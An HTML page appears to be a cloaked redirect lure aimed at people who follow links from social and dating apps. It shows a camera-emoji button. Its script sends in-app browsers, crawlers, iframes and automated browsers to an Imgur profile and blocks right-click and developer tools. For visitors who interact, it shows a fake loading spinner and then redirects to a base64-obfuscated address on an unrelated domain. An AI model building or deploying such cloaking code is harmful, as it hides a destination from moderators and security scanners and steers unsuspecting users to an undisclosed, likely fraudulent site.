<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>üì∑</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="robots" content="noindex, nofollow" />
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      background: linear-gradient(to bottom, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
      font-family: system-ui, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
    }
    .btn {
      background-color: white;
      color: black;
      border: none;
      border-radius: 999px;
      padding: 0.5rem 9rem;
      font-size: 2rem;
      cursor: pointer;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
    }
    #loading {
      display: none;
      flex-direction: column;
      align-items: center;
      color: white;
      font-size: 2rem;
    }
    .loader {
      margin-top: 1rem;
      width: 50px;
      height: 50px;
      border: 6px solid #fff;
      border-top: 6px solid #555;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <button class="btn" onclick="go()">üì∑</button>
  <div id="loading">
    ‚è≥ Loading...
    <div class="loader"></div>
  </div>

  <script>
    (() => {
      const u = navigator.userAgent.toLowerCase();
      const bots = ["instagram", "fbav", "facebook", "tinder", "okhttp", "webview", "line", "pinterest", "telegram", "grindr"];
      const isBot = bots.some(s => u.includes(s)) || window.top !== window.self || navigator.webdriver;

      let human = false;

      const markHuman = () => human = true;
      document.addEventListener("mousemove", markHuman, { once: true });
      document.addEventListener("touchstart", markHuman, { once: true });
      document.addEventListener("keydown", markHuman, { once: true });

      setTimeout(() => {
        if (isBot || !human) {
          location.href = "https://imgur.com/user/carlovershub";
        }
      }, 3000);
    })();

    document.addEventListener("contextmenu", e => e.preventDefault());
    document.onkeydown = e => {
      if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && e.keyCode === 73)) return false;
    };

    let interacted = false;
    document.addEventListener("mousemove", () => interacted = true);
    document.addEventListener("touchstart", () => interacted = true);
    document.addEventListener("keypress", () => interacted = true);

    function go() {
      if (!interacted) return;

      document.querySelector(".btn").style.display = "none";
      document.getElementById("loading").style.display = "flex";

      setTimeout(() => {
        const p1 = "aHR0cHM6Ly9nYXlyb24ubGlmZS9y";
        const p2 = "ZWhiaXhlZQ==";
        const url = atob(p1 + p2);
        if (url.startsWith("http")) window.location.replace(url);
      }, 2000 + Math.random() * 1000);
    }
  </script>
</body>
</html>
